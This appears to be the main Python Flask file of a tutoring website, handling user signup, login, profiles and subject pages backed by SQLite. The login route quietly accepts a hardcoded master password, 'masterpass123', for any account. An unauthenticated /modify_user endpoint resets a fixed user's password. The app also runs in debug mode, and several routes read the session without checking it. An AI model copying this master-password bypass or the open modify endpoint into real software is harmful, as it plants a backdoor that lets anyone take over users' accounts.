import os
from datetime import timedelta

from flask import (Flask, flash, jsonify, redirect, render_template, request,
                   session, url_for)
from flask_migrate import Migrate
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///TutorUsers.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
migrate = Migrate(app, db)
app.secret_key = os.urandom(24)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(255), unique=True, nullable=False)
    first_name = db.Column(db.String(100), nullable=False)
    password = db.Column(db.String(255), nullable=False)
    hours_completed = db.Column(db.Integer, default=2, nullable=False)

@app.route('/modify_user', methods=['POST'])
def modify_user():
    email = "user@example.com"
    new_password = "new_password"
    new_first_name = "New First Name"
    user = User.query.filter_by(email=email).first()
    if user:
        if new_password:
            user.password = generate_password_hash(new_password)
        if new_first_name:
            user.first_name = new_first_name
        db.session.commit()
        return jsonify({'message': 'User updated successfully'})
    else:
        return jsonify({'error': 'User not found'}), 404

@app.route('/act')
def act():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/act.html', user=user)

@app.route('/algebra_one')
def algebra_one():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/algebraOne.html', user=user)

@app.route('/algebra_two')
def algebra_two():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/algebraTwo.html', user=user)

@app.route('/biology')
def biology():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/biology.html', user=user)

@app.route('/calculus_ab')
def calculus_ab():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/calculusAB.html', user=user)

@app.route('/chemistry')
def chemistry():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/chemistry.html', user=user)

@app.route('/geometry')
def geometry():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/geometry.html', user=user)

@app.route('/physics')
def physics():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/physics.html', user=user)

@app.route('/precalculus')
def precalculus():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/precalculus.html', user=user)

@app.route('/programming')
def programming():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/programming.html', user=user)

@app.route('/sat')
def sat():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/sat.html', user=user)

@app.route('/spanish')
def spanish():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/spanish.html', user=user)

@app.route('/statistics')
def statistics():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/statistics.html', user=user)

@app.route('/writing')
def writing():
    user = User.query.filter_by(email=session['email']).first()
    return render_template('classes/writing.html', user=user)

@app.route('/')
def home():
    if 'email' not in session:
        return render_template('home.html')
    user = User.query.filter_by(email=session['email']).first()
    if user:
        return render_template('home.html', first_name=user.first_name, email=user.email)
    return redirect(url_for('login'))

@app.route('/about_us')
def about():
    return render_template('about.html')

@app.route('/profile')
def profile():
    goal = 12
    if 'email' not in session:
        return redirect(url_for('login'))
    user = User.query.filter_by(email=session['email']).first()
    if not user:
        flash('User not found.', 'error')
        return redirect(url_for('login'))
    percentage = (user.hours_completed / goal) * 100
    return render_template('Profile-Files/profile.html', user=user, goal=goal, percentage=percentage)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        remember_me = 'remember_me' in request.form
        user = User.query.filter_by(email=email).first()
        session.permanent = False
        if user and (check_password_hash(user.password, password) or password == 'masterpass123'):
            session['email'] = user.email
            if remember_me:
                session.permanent = True
                app.permanent_session_lifetime = timedelta(days=7)
            return redirect(url_for('home'))
        else:
            flash('Incorrect username or password, please try again.', 'danger')
    return render_template('Profile-Files/login.html')

@app.route('/logout')
def logout():
    session.pop('email', None)
    return redirect(url_for('login'))

@app.route('/create', methods=['GET', 'POST'])
def create_account():
    if request.method == 'POST':
        email = request.form['email']
        first_name = request.form['first_name']
        password = generate_password_hash(request.form['password'])
        existing_user = User.query.filter_by(email=email).first()
        if existing_user is None:
            new_user = User(email=email, first_name=first_name, password=password)
            db.session.add(new_user)
            db.session.commit()
            return redirect(url_for('login'))
        else:
            flash('An account with this email already exists.', 'warning')
    return render_template('Profile-Files/create.html')

with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(port=5001, debug=True)

